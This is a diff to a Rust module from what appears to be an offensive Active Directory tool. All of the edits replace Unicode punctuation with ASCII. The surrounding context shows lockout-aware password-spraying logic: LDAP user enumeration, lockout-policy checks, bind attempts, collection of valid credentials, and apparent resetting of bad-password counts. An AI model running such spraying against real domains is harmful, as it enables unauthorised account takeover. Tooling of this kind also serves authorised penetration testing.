@@ -1,4 +1,4 @@
-//! Password Spraying — lockout-safe horizontal credential attack.
+//! Password Spraying -- lockout-safe horizontal credential attack.
 //!
 //! Tries each password against every user in one "round" before moving to the
 //! next password.  Before each attempt the module checks the domain lockout
@@ -24,9 +24,9 @@ use serde::{Deserialize, Serialize};
 use std::time::{SystemTime, UNIX_EPOCH};
 use tracing::{debug, info, warn};
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Constants
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// LDAP result code for "invalid credentials" (includes AD sub-errors)
 const LDAP_INVALID_CREDENTIALS: u32 = 49;
@@ -36,9 +36,9 @@ const DIAG_LOCKED: &str = "775";
 const DIAG_DISABLED: &str = "533";
 const DIAG_EXPIRED: &str = "532";
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Configuration
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Time window for spray operations (UTC hours)
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -64,7 +64,7 @@ impl Default for SprayTimeWindow {
 /// Configuration for a password spray run.
 #[derive(Debug, Clone)]
 pub struct SprayConfig {
-    /// Passwords to try — one horizontal round per password.
+    /// Passwords to try -- one horizontal round per password.
     pub passwords: Vec<String>,
     /// Explicit username list to spray.  If empty, enumerate from LDAP.
     pub usernames: Vec<String>,
@@ -125,9 +125,9 @@ impl Default for SprayConfig {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Results
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct SprayResult {
@@ -158,9 +158,9 @@ impl SprayResult {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Entry point
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Run a lockout-safe password spray against the configured DC.
 pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayResult> {
@@ -174,7 +174,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
 
     // Build username list
     let usernames: Vec<String> = if spray.usernames.is_empty() {
-        info!("Spray: no usernames given — enumerating enabled users via LDAP...");
+        info!("Spray: no usernames given -- enumerating enabled users via LDAP...");
         collect_spray_targets(hunt).await?
     } else {
         spray.usernames.clone()
@@ -189,7 +189,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
     let lockout_threshold: u32 = if spray.check_policy {
         match query_lockout_threshold(hunt).await {
             Ok(0) => {
-                info!("Spray: lockout policy is disabled (threshold=0) — spraying without limit");
+                info!("Spray: lockout policy is disabled (threshold=0) -- spraying without limit");
                 0
             }
             Ok(t) => {
@@ -197,7 +197,7 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                 t
             }
             Err(e) => {
-                warn!("Spray: cannot read lockout policy ({e}) — treating threshold as 0");
+                warn!("Spray: cannot read lockout policy ({e}) -- treating threshold as 0");
                 0
             }
         }
@@ -260,15 +260,15 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
             let upn = format!("{}@{}", username, hunt.domain);
             match attempt_ldap_bind(&ldap_url, &upn, password).await {
                 BindOutcome::Success => {
-                    info!("Spray: ✓ VALID  → {}:[REDACTED]", username);
-                    debug!("Spray: valid credentials — {}:{}", username, password);
+                    info!("Spray: [+] VALID  -> {}:[REDACTED]", username);
+                    debug!("Spray: valid credentials -- {}:{}", username, password);
                     lockout_burst = lockout_burst.saturating_sub(1);
                     result
                         .valid_creds
                         .push((username.clone(), password.clone()));
                 }
                 BindOutcome::InvalidCredentials => {
-                    debug!("Spray: {username} — wrong password");
+                    debug!("Spray: {username} -- wrong password");
                 }
                 BindOutcome::AccountLocked => {
                     warn!("Spray: {username} is LOCKED OUT");
@@ -295,30 +295,30 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                         }
                     }
                     if spray.stop_on_lockout {
-                        warn!("Spray: aborting — stop_on_lockout is set");
+                        warn!("Spray: aborting -- stop_on_lockout is set");
                         break 'outer;
                     }
                 }
                 BindOutcome::AccountDisabled => {
-                    debug!("Spray: {username} — disabled, skipping for remainder");
+                    debug!("Spray: {username} -- disabled, skipping for remainder");
                     result.skipped.push(username.clone());
                 }
                 BindOutcome::PasswordExpired => {
-                    info!("Spray: {username} — password expired (recording as valid candidate)");
+                    info!("Spray: {username} -- password expired (recording as valid candidate)");
                     lockout_burst = lockout_burst.saturating_sub(1);
                     result
                         .valid_creds
                         .push((username.clone(), password.clone()));
                 }
                 BindOutcome::Error(e) => {
-                    debug!("Spray: {username} — bind error: {e}");
+                    debug!("Spray: {username} -- bind error: {e}");
                 }
             }
         }
     }
 
     info!(
-        "Spray complete — valid={} skipped={} locked={} rollback={} rollback_fail={} attempts={}",
+        "Spray complete -- valid={} skipped={} locked={} rollback={} rollback_fail={} attempts={}",
         result.valid_creds.len(),
         result.skipped.len(),
         result.locked_out.len(),
@@ -329,9 +329,9 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
     Ok(result)
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Internal helpers
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Classification of a single LDAP bind attempt.
 enum BindOutcome {
@@ -467,9 +467,9 @@ async fn reset_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<()> {
     Ok(())
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Advanced Lockout Protection Features
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Detect the PDC emulator FSMO role holder for accurate badPwdCount queries.
 /// The PDC is the authoritative source for badPwdCount across the domain.
